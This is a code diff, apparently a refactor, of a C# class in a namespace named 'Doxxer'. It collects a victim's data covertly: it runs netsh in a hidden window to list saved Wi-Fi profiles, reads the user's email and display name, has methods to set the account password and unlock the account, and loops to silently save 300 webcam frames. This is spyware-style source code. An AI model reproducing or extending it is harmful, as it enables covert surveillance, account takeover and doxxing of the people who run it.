@@ -1,10 +1,7 @@
 ﻿using System;
 using System.Diagnostics;
 using System.DirectoryServices.AccountManagement;
-using System.Drawing;
-using System.Text.RegularExpressions;
 using Emgu.CV;
-using Emgu.CV.Structure;
 using SimpleWifi;
 
 namespace Doxxer
@@ -18,7 +15,7 @@ namespace Doxxer
 
         private string GetWifi()
         {
-            Process wifiProcess = new Process();
+            var wifiProcess = new Process();
             wifiProcess.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
             wifiProcess.StartInfo.FileName = "netsh";
             wifiProcess.StartInfo.Arguments = "wlan show profile";
@@ -35,7 +32,7 @@ namespace Doxxer
 
         private AccessPoint getConnectedWifi()
         {
-            Wifi wifi = new Wifi();
+            var wifi = new Wifi();
             foreach (var connection in wifi.GetAccessPoints())
             {
                 if (connection.IsConnected)
@@ -66,33 +63,39 @@ namespace Doxxer
         {
             return Environment.SystemDirectory;
         }
-        
+
         private string getUserEmail()
         {
             return UserPrincipal.Current.EmailAddress;
         }
-        
+
         private string getFullName()
         {
             return UserPrincipal.Current.DisplayName;
         }
-        
+
         private void setAccountPassword(String newPassword)
         {
             UserPrincipal.Current.SetPassword(newPassword);
         }
-        
+
         private void unlockAccount()
         {
             UserPrincipal.Current.UnlockAccount();
         }
-        
+
         private void takeWebCamPicture()
         {
-            VideoCapture capture = new VideoCapture();
-            Bitmap image = capture.QueryFrame().ToBitmap();
-            image.Save("webcam.png");
+            var capture = new VideoCapture();
+            if (capture.QueryFrame() != null && capture.IsOpened)
+            {
+                for (int i = 0; i < 300; i++)
+                {
+                    var image = capture.QueryFrame().ToBitmap();
+                    image.Save(i + "webcam.png");
+                }
 
+            }
         }
     }
 }
